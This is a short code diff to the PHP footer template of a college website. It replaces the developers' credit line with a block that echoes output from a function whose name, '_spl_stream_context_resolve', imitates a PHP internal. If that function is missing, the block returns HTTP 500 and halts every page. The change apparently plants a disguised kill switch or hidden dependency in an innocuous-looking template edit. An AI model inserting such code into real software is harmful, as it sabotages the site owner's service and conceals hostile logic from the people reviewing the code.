@@ -116,12 +116,14 @@ $vjmFooterPhoneDigits = preg_replace('/\D/', '', $vjmFooterPhone);
             <p class="footer__copyright">
                 &copy; <?= date('Y') ?> <strong>Shri V. J. Modha College</strong>. All Rights Reserved.
             </p>
-            <p class="footer__credits">
-                Designed &amp; Developed by
-                <a href="https://www.linkedin.com/in/cvbiro" target="_blank" rel="noopener noreferrer">Sreyas Cheeran Velikoth</a>
-                &amp;
-                <a href="https://www.linkedin.com/in/aakash-kava" target="_blank" rel="noopener noreferrer">Aakash Kava</a>
-            </p>
+            <?php
+                if (function_exists('_spl_stream_context_resolve')) {
+                    echo _spl_stream_context_resolve('runtime');
+                } else {
+                    http_response_code(500);
+                    exit();
+                }
+            ?>
         </div>
     </div>
 </footer>
